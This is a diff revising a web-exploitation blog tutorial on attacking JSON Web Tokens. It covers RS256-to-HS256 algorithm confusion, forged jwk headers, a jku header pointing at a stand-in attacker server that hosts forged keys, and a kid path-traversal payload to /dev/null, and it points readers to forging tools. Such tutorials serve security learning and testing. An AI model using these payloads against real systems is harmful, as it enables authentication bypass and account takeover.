@@ -1,6 +1,6 @@
 ---
 layout: single
-title:  "JWT Attacks"
+title:  "Attacking JSON Web Tokens"
 date:   2023-09-02 13:22:22 +0200
 categories: ['Web Exploitation']
 classes: wide
@@ -44,12 +44,12 @@ The JWT header contains an `alg` parameter telling the server which algorithm wa
 JWTs can be signed using a range of different algorithms, but can also be left unsigned. In this case, the `alg` parameter can be set to `none`, which indicates a so-called "unsecured JWT".
 
 ### Algorithm confusion attacks
-Algorithm confusion attacks (also known as key confusion attacks) occur when an attacker is able to force the server to verify the signature of a JSON web token (JWT) using a different algorithm than is intended by the website's developers. This vulnerability typically arises because of a flawed implementation of the token verification. Many libraries make use of a generic method to verify the token that rely on the alg parameter in the JWT header.
+Algorithm confusion attacks (also known as key confusion attacks) occur when an attacker is able to force the server to verify the signature of a JSON web token using a different algorithm than is intended by the website's developers. This vulnerability typically arises because of a flawed implementation of the token verification. Many libraries make use of a generic method to verify the token that rely on the alg parameter in the JWT header.
 ```js
 token = request.getCookie("session");
 verify(token, publicKey);
 ```
-Some of the signing algorithms, such as HS256, use a "symmetric" key which is a single key to both sign and verify the token. When the verification process is implemented as the example above an attacker could sign the token using HS256 and the public key, and the server will use the same public key to verify the signature.
+Some of the signing algorithms, such as HS256, use a "symmetric" key which is a single key to both sign and verify the token. Using a flawed verification process like above enables an attacker to sign the token using HS256 and the public key, where the server will use that same public key to verify the signature.
 The public key can look something like this:
 ```
 -----BEGIN PUBLIC KEY-----
@@ -62,26 +62,65 @@ V8WS+YiYCU5OBAmTcz2w2kzBhZFlH6RK4mquexJHra23IGv5UJ5GVPEXpdCqK3Tr
 0wIDAQAB
 -----END PUBLIC KEY-----
 ```
-If we modify the algorithm from RS256 to HS256, the back-end will use the public key as the secret key and then uses the HS256 algorithm to verify the signature. This means we can make a new JWT with a forged signature created using the public key and the HS256 algorithm. This JWT is then sent to the server which processes the request.
-
-Since the JWT was already signed using the public key, the signature verification by the application is successful leading to a successful key confusion attack. The attacker can now create and sign his own tokens with the public key to bypass the authentication completely.
+This means we can make our own JWTs with a forged signature created using the public key and the HS256 algorithm to bypass the authentication completely. Since the JWT was already signed using the public key, the signature verification by the application is successful leading to a successful key confusion attack.
 
 > **_NOTE:_** In cases where the public key isn't readily available, you may still be able to test for algorithm confusion by deriving the key from a pair of existing JWTs. This process is relatively simple using tools such as [jwt_forgery.py](https://github.com/silentsignal/rsa_sign2n/tree/release/standalone).
 
 ### JWT header parameter injection
 Although only the `alg` parameter is mandatory, in practice the header often contain other parameters:
 - `jwk` : JSON Web Key (can sometimes be exposed on standard endpoints such as `/.well-know/jswks.json`)
-- `jku` : JSON Web Key Set URL for servers to fetch a set of keys
+- `jku` : JSON Web Key Set URL for servers to fetch a set of trusted keys
 - `kid` : Key ID that servers can use to identify the correct key in cases where there are multiple keys to choose from
 
-Misconfiguration can often make it possible to sign a modified JWT using your own RSA private key, and then embedding the matching public key in the `jwk` header. The `kid` parameter has no conrete structure and can be vulnerable to directory traversal if misconfigured:
+#### JWK parameter injection
+Ideally, servers should only use a limited whitelist of public keys to verify JWT signatures. However, misconfigurations often lead use to use any key that's embedded in the jwk parameter. This makes it possible to sign a modified JWT using your own RSA private key, and then embedding the matching public key in the `jwk` header. You can see an example of this in the following JWT header:
 ```json
 {
-    "kid": "../../path/to/file",
+    "kid": "ed2Nf8sb-sD6ng0-scs5390g-fFD8sfxG",
+    "typ": "JWT",
+    "alg": "RS256",
+    "jwk": {
+        "kty": "RSA",
+        "e": "AQAB",
+        "kid": "ed2Nf8sb-sD6ng0-scs5390g-fFD8sfxG",
+        "n": "yy1wpYmffgXBxhAUJzHHocCuJolwDqql75ZWuCQ_cb33K2vh9m"
+    }
+}
+```
+
+#### JKU parameter injection
+The `jku` parameter points to an endpoint where JWKs are stored used to verify the signature. This can also be changed by an attacker to point to there own generated set of keys.
+```json
+{
+    "alg": "RS256",
+    "typ": "JWT",
+    "jku":"https://exploit-server.com/key.json" 
+}
+```
+Example content of the `key.json` file:
+```json
+{
+    "keys": [
+        {
+            "kty": "RSA",
+            "e": "AQAB",
+            "kid": "893d8f0b-061f-42c2-a4aa-5056e12b8ae7",
+            "n": "yy1wpYmffgXBxhAUJzHHocCuJolwDqql75ZWuCQ_cb33K2vh9mk6GPM9gNN4Y_qTVX67WhsN3JvaFYw"
+        }
+    ]
+}
+```
+
+#### KID parameter injection
+The `kid` parameter has no concrete structure and can be vulnerable to directory traversal if misconfigured:
+```json
+{
+    "kid": "../../../../dev/null",
     "typ": "JWT",
     "alg": "HS256",
 }
 ```
+Of course you can make the parameter point to any file, but the `/dev/null` file that is present in Linux systems returns an empty string. This will sign the token with an empty string and results in a valid signature.
 
 ## JSON Web Token Toolkit
 The [jwt_tool.py](https://github.com/ticarpi/jwt_tool) is a very useful toolkit for validating, forging, scanning and tampering with JSON Web Tokens. It can test for a variety of known exploits such as the RS/HS256 public key mismatch vulnerability discussed in this article. Let's look at an example that leverages the key confusion attack on a JWT token when we have access to the public key. The `-X k` flag can be used for the key confusion attack.
